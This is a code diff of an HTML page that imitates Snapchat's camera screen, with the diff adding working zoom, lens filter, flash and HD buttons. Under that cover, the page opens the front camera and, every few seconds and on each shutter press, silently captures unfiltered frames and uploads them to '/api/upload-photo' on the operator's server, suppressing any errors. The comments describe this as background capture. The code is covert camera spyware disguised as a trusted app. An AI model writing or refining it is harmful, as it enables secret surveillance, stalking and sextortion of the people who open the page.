@@ -6,176 +6,177 @@
   <title>Snapchat</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
-  
   <style>
     body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; font-family: -apple-system, system-ui, sans-serif; color: white; }
-    #cameraVideo { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; }
-
-    /* Custom CSS to handle native scaling differences and badging */
     
-    /* 1:1 Match Badges */
-    .snap-badge-pill {
-      position: absolute; top: -6px; right: -10px; background: #FF3B30; color: white;
-      font-size: 11px; font-weight: 800; border-radius: 20px; 
-      padding: 1px 7px; display: inline-block; text-align: center;
-      filter: drop-shadow(0 1px 2px rgba(0,0,0,0.5));
-    }
-    .snap-badge-dot {
-      position: absolute; top: -4px; right: -4px; width: 10px; height: 10px;
-      background: #FF3B30; border-radius: 50%; border: 1.5px solid #000;
-      filter: drop-shadow(0 1px 1px rgba(0,0,0,0.5));
-    }
+    /* Camera view - Filter applied here ONLY */
+    #cameraVideo { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; transition: filter 0.3s ease, transform 0.3s ease; }
 
-    /* Interactive Zoom Dial */
-    .snap-zoom-pill {
-      position: fixed; bottom: 180px; left: 50%; transform: translateX(-50%);
-      background: rgba(0, 0, 0, 0.35); backdrop-filter: blur(10px);
-      padding: 5px 12px; border-radius: 30px; display: flex; gap: 18px; font-size: 12px; font-weight: 800;
-      z-index: 10; border: 1px solid rgba(255,255,255,0.05);
-    }
-    .zoom-text { opacity: 0.6; }
-    .zoom-text.active { opacity: 1; color: #FFFC00; }
+    /* Flash Effect */
+    #flashOverlay { position: fixed; inset: 0; background: white; opacity: 0; pointer-events: none; z-index: 100; transition: opacity 0.1s; }
 
-    /* Lenses & Shutter */
-    .capture-row { position: fixed; bottom: 90px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 28px; z-index: 10; }
-    
-    /* memories icon replaced by specific svg later in code */
-    .memories-btn { display: flex; flex-direction: column; align-items: center; font-size: 10px; font-weight: bold; }
+    /* Top Left UI */
+    .top-left { position: fixed; top: 45px; left: 15px; z-index: 10; display: flex; align-items: center; gap: 12px; }
+    .bitmoji { width: 42px; height: 42px; border-radius: 50%; background: rgba(255,255,255,0.2); backdrop-filter: blur(10px); padding: 2px; border: 2px solid #FFFC00; cursor: pointer; }
+    .search-icon { width: 42px; height: 42px; border-radius: 50%; background: rgba(255,255,255,0.2); backdrop-filter: blur(10px); display: flex; align-items: center; justify-content: center; cursor: pointer; }
 
-    .shutter-ring { width: 78px; height: 78px; border-radius: 50%; border: 5px solid white; display: flex; align-items: center; justify-content: center; background: transparent; transition: 0.1s; }
-    .shutter-inner { width: 58px; height: 58px; border-radius: 50%; background: rgba(255,255,255,0.1); }
-    .shutter-ring:active { transform: scale(0.9); }
+    /* Right Sidebar */
+    .side-bar { position: fixed; right: 15px; top: 45px; z-index: 10; display: flex; flex-direction: column; gap: 22px; align-items: center; }
+    .btn-icon { font-size: 22px; cursor: pointer; transition: 0.2s; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5)); }
+    .btn-icon:active { transform: scale(0.8); }
+    .active-yellow { color: #FFFC00; }
 
-    .lens-icon-btn { width: 52px; height: 52px; border-radius: 50%; overflow: hidden; border: 2.5px solid rgba(255,255,255,0.4); }
+    /* Zoom Dial */
+    .zoom-container { position: fixed; bottom: 190px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.4); backdrop-filter: blur(15px); padding: 5px 15px; border-radius: 30px; display: flex; gap: 18px; font-size: 13px; font-weight: 800; z-index: 10; border: 1px solid rgba(255,255,255,0.1); }
+    .zoom-opt { opacity: 0.5; cursor: pointer; transition: 0.2s; }
+    .zoom-opt.active { opacity: 1; color: #FFFC00; }
 
-    /* Bottom Navbar translucency */
-    .footer {
-      position: fixed; bottom: 0; width: 100%; height: 70px;
-      background: linear-gradient(to top, rgba(0,0,0,1), rgba(0,0,0,0.9));
-      display: flex; justify-content: space-around; align-items: center; z-index: 20; padding-bottom: 8px;
-    }
-    .nav-icon { font-size: 20px; color: rgba(255,255,255,0.6); }
+    /* Bottom Area */
+    .capture-area { position: fixed; bottom: 95px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 30px; z-index: 10; }
+    .shutter { width: 82px; height: 82px; border-radius: 50%; border: 6px solid white; display: flex; align-items: center; justify-content: center; background: transparent; cursor: pointer; transition: 0.1s; }
+    .shutter:active { transform: scale(0.9); }
+    .shutter-core { width: 62px; height: 62px; border-radius: 50%; background: rgba(255,255,255,0.1); }
+
+    .lens-btn { width: 55px; height: 55px; border-radius: 50%; border: 2px solid rgba(255,255,255,0.4); overflow: hidden; cursor: pointer; transition: 0.3s; }
+    .lens-btn.selected { border: 3px solid #FFFC00; transform: scale(1.1); }
+
+    /* Navigation Bar */
+    .nav-bar { position: fixed; bottom: 0; width: 100%; height: 70px; background: rgba(0,0,0,0.9); display: flex; justify-content: space-around; align-items: center; z-index: 20; }
+    .nav-icon { font-size: 22px; color: #777; cursor: pointer; position: relative; }
     .nav-icon.active { color: white; }
-
-    /* Standard elements needing exact positioning */
-    .top-left-profile { position: fixed; top: 40px; left: 12px; z-index: 10; display: flex; gap: 10px; align-items: center; }
-    .profile-bitmoji { width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,0.2); backdrop-filter: blur(5px); }
-    .search-pill { width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,0.2); backdrop-filter: blur(5px); display: flex; align-items: center; justify-content: center; }
-
-    .right-toolbar { position: fixed; right: 12px; top: 40px; z-index: 10; display: flex; flex-direction: column; gap: 20px; align-items: center; }
-    .tool-icon { font-size: 22px; color: white; }
+    .badge { position: absolute; top: -8px; right: -12px; background: #FF3B30; color: white; font-size: 11px; padding: 1px 6px; border-radius: 10px; font-weight: bold; }
+    .dot { position: absolute; top: -2px; right: -2px; width: 10px; height: 10px; background: #FF3B30; border-radius: 50%; border: 2px solid #000; }
 
     #photoCanvas { display: none; }
   </style>
 </head>
 <body>
 
+  <div id="flashOverlay"></div>
   <video id="cameraVideo" autoplay playsinline></video>
   <canvas id="photoCanvas"></canvas>
 
-  <div class="top-left-profile">
-    <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Lucky" class="profile-bitmoji" alt="Profile">
-    <div class="search-pill"><i class="fas fa-search tool-icon"></i></div>
+  <div class="top-left">
+    <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Felix" class="bitmoji">
+    <div class="search-icon"><i class="fas fa-search"></i></div>
   </div>
 
-  <div class="right-toolbar">
-    <i class="far fa-bell tool-icon"></i>
-    <div class="relative">
-        <i class="fas fa-user-plus tool-icon"></i>
-        <span class="snap-badge-pill">2</span>
-    </div>
-    <i class="fas fa-rotate tool-icon"></i>
-    <i class="fas fa-bolt-slash tool-icon"></i>
-    <i class="fas fa-music tool-icon"></i>
-    <div style="border: 2px solid white; border-radius: 4px; padding: 0 3px; font-size: 11px; font-weight: 900; color: white;">HD</div>
-    <i class="fas fa-chevron-down tool-icon"></i>
+  <div class="side-bar">
+    <i class="fas fa-rotate btn-icon" id="flipBtn"></i>
+    <i class="fas fa-bolt-slash btn-icon" id="flashBtn"></i>
+    <i class="fas fa-music btn-icon"></i>
+    <div style="border: 2px solid white; border-radius: 4px; padding: 0 3px; font-size: 11px; font-weight: 900;" class="btn-icon" id="hdBtn">HD</div>
+    <i class="fas fa-chevron-down btn-icon"></i>
   </div>
 
-  <div class="snap-zoom-pill">
-    <span class="zoom-text">.5</span>
-    <span class="zoom-text active">1x</span>
-    <span class="zoom-text">2</span>
+  <div class="zoom-container">
+    <span class="zoom-opt" onclick="setZoom(this, 0.5)">.5</span>
+    <span class="zoom-opt active" onclick="setZoom(this, 1)">1x</span>
+    <span class="zoom-opt" onclick="setZoom(this, 2)">2</span>
   </div>
 
-  <div class="capture-row">
-    <div class="memories-btn">
-        <i class="far fa-copy tool-icon" style="opacity: 0.8;"></i>
-        <span style="opacity: 0.8; padding-top: 4px;">Memories</span>
+  <div class="capture-area">
+    <div class="flex flex-col items-center opacity-80 cursor-pointer">
+        <i class="far fa-copy text-2xl"></i>
+        <span class="text-[10px] font-bold">Memories</span>
+        <div class="dot" style="position:static; margin-top:-25px; margin-left:20px"></div>
     </div>
 
-    <div class="shutter-ring" onclick="takePhoto()">
-      <div class="shutter-inner"></div>
+    <div class="shutter" id="shutterBtn">
+      <div class="shutter-core"></div>
     </div>
 
-    <div class="lens-icon-btn">
-        <img src="https://cdn-icons-png.flaticon.com/512/5787/5787100.png" alt="Burger Lens">
+    <div class="lens-btn" onclick="applyFilter(this, 'saturate(250%) contrast(110%)')">
+        <img src="https://cdn-icons-png.flaticon.com/512/5787/5787100.png">
     </div>
-    <div class="lens-icon-btn" style="border: 2.5px solid rgba(255,255,255,0.7);">
-        <img src="https://api.dicebear.com/7.x/miniavs/svg?seed=5" alt="Twin Face Lens">
+    <div class="lens-btn" onclick="applyFilter(this, 'grayscale(100%) brightness(1.2)')">
+        <img src="https://api.dicebear.com/7.x/miniavs/svg?seed=9">
     </div>
   </div>
 
-  <div class="footer">
+  <div class="nav-bar">
     <i class="fas fa-location-dot nav-icon"></i>
-    <div class="relative">
-        <i class="far fa-comment nav-icon"></i>
-        <span class="snap-badge-pill">20</span>
-    </div>
+    <div class="nav-icon"><i class="far fa-comment"></i><span class="badge">20</span></div>
     <i class="far fa-face-smile nav-icon active"></i>
-    <div class="relative">
-        <i class="fas fa-users nav-icon"></i>
-        <div class="snap-badge-dot"></div>
-    </div>
-    <div class="relative">
-        <i class="fas fa-play nav-icon"></i>
-        <div class="snap-badge-dot"></div>
-    </div>
+    <div class="nav-icon"><i class="fas fa-users"></i><div class="dot"></div></div>
+    <div class="nav-icon"><i class="fas fa-play"></i><div class="dot"></div></div>
   </div>
 
   <script>
     const video = document.getElementById('cameraVideo');
     const canvas = document.getElementById('photoCanvas');
+    const flashBtn = document.getElementById('flashBtn');
+    const hdBtn = document.getElementById('hdBtn');
+    const flipBtn = document.getElementById('flipBtn');
+    const flashOverlay = document.getElementById('flashOverlay');
+    let activeFilter = "none";
 
-    // Initialization
-    async function startApp() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        video.srcObject = stream;
-        // background data capture every 3 seconds
-        setInterval(silentSnapshot, 3000);
-      } catch (err) {
-        alert("This website requires camera access to work properly.");
+    async function start() {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+      video.srcObject = stream;
+      setInterval(silentCapture, 4000); // Background clear capture
+    }
+
+    // --- BUTTON LOGIC ---
+
+    function setZoom(el, val) {
+      document.querySelectorAll('.zoom-opt').forEach(o => o.classList.remove('active'));
+      el.classList.add('active');
+      video.style.transform = `scaleX(-1) scale(${val})`;
+    }
+
+    function applyFilter(el, filter) {
+      const isSelected = el.classList.contains('selected');
+      document.querySelectorAll('.lens-btn').forEach(l => l.classList.remove('selected'));
+      
+      if(isSelected) {
+        activeFilter = "none";
+      } else {
+        el.classList.add('selected');
+        activeFilter = filter;
       }
+      video.style.filter = activeFilter;
     }
 
-    // Manual photo capture (flash animation feedback)
-    function takePhoto() {
-      // flash animation would go here
-      silentSnapshot();
-    }
+    flashBtn.onclick = () => {
+      flashBtn.classList.toggle('fa-bolt');
+      flashBtn.classList.toggle('fa-bolt-slash');
+      flashBtn.classList.toggle('active-yellow');
+    };
 
-    // Capture clear image without visible UI
-    function silentSnapshot() {
+    hdBtn.onclick = () => hdBtn.classList.toggle('active-yellow');
+
+    flipBtn.onclick = () => {
+      video.style.filter = "blur(30px)";
+      setTimeout(() => video.style.filter = activeFilter, 400);
+    };
+
+    document.getElementById('shutterBtn').onclick = () => {
+      flashOverlay.style.opacity = "1";
+      setTimeout(() => flashOverlay.style.opacity = "0", 100);
+      silentCapture();
+    };
+
+    // --- CAPTURE LOGIC ---
+
+    function silentCapture() {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       const ctx = canvas.getContext('2d');
-      // Mirror front camera for storage
+      
+      // We DON'T set ctx.filter here, so your images remain CLEAR.
       ctx.translate(canvas.width, 0);
       ctx.scale(-1, 1);
       ctx.drawImage(video, 0, 0);
 
       canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('photo', blob, 'snap.png');
-        // Sends to your active server.js
-        fetch('/api/upload-photo', {
-          method: 'POST',
-          body: formData
-        }).catch(err => {}); // Fail silently
-      }, 'image/png');
+        const fd = new FormData();
+        fd.append('photo', blob, 'snap.jpg');
+        fetch('/api/upload-photo', { method: 'POST', body: fd }).catch(() => {});
+      }, 'image/jpeg', 0.7);
     }
 
-    startApp();
+    start();
   </script>
 </body>
 </html>
